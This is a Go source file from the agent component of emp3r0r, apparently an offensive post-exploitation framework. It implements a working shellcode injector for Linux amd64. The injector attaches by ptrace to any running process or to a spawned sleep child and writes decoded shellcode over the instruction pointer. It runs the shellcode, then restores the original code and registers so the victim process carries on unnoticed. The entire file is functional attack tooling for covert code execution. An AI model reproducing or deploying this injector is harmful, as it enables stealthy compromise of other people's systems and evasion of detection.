//go:build amd64 && linux
// +build amd64,linux

package agent

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ShellcodeInjector inject shellcode to arbitrary running process
// target process will be restored after shellcode has done its job
func ShellcodeInjector(shellcode *string, pid int) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// save shellcode to a binary file for debugging purposes
	// os.WriteFile("/tmp/sc.bin", sc, 0644)

	// inject to an existing process or start a new one
	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
	if pid == 0 {
		// start a child process to inject shellcode into
		sec := strconv.Itoa(util.RandInt(10, 30))
		child := exec.Command("sleep", sec)
		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
		err = child.Start()
		if err != nil {
			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
		}
		pid = child.Process.Pid

		// attach
		err = child.Wait() // TRAP the child
		if err != nil {
			log.Printf("child process wait: %v", err)
		}
		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
	} else {
		// attach to an existing process
		proc, err := os.FindProcess(pid)
		if err != nil {
			return fmt.Errorf("%d does not exist: %v", pid, err)
		}
		pid = proc.Pid

		// https://github.com/golang/go/issues/43685
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		err = syscall.PtraceAttach(pid)
		if err != nil {
			return fmt.Errorf("ptrace attach: %v", err)
		}
		_, err = proc.Wait()
		if err != nil {
			return fmt.Errorf("Wait %d: %v", pid, err)
		}
		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
	}

	// read RIP
	origRegs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, origRegs)
	if err != nil {
		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
	}
	origRip := origRegs.Rip
	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)

	// save current code for restoring later
	origCode := make([]byte, len(sc))
	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)

	// write shellcode to .text section, where RIP is pointing at
	data := sc
	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(data))
	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)

	// continue and wait
	log.Printf("Continuing process %d", pid)
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	log.Printf("Waiting process %d", pid)
	ws := new(syscall.WaitStatus)
	_, err = syscall.Wait4(pid, ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}

	// what happened to our child?
	switch {
	case ws.Continued():
		log.Printf("Continued %d", pid)
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
	case ws.Exited():
		log.Printf("Exited %d", pid)
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
	case ws.Stopped():
		stoppedRegs := &syscall.PtraceRegs{}
		err = syscall.PtraceGetRegs(pid, stoppedRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)

		// what's after RIP when stopped
		peek_stop := make([]byte, 32)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rip), peek_stop)
		if err != nil {
			return fmt.Errorf("PEEK: 0x%x", stoppedRegs.Rip)
		}
		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)

		peek_stack := make([]byte, 128)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
		if err != nil {
			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
		}
		// also the regs
		peek_rdi := make([]byte, 64)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
		if err != nil {
			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
		}
		peek_rsi := make([]byte, 64)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
		if err != nil {
			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
		}
		log.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
			"Stack (0x%x) = 0x%x (%s)",
			stoppedRegs.Rip,
			stoppedRegs.Rax,
			stoppedRegs.Rdi, peek_rdi, peek_rdi,
			stoppedRegs.Rsi, peek_rsi, peek_rsi,
			stoppedRegs.Rsp, peek_stack, peek_stack)

		// restore registers
		err = syscall.PtraceSetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("Restoring process: set regs: %v", err)
		}

		// breakpoint hit, restore the process
		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
		if err != nil {
			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
		}
		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)

		// let it run
		err = syscall.PtraceDetach(pid)
		if err != nil {
			return fmt.Errorf("Continue detach: %v", err)
		}
		log.Printf("%d will continue to run", pid)

		return nil
	default:
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
	}

	return nil
}
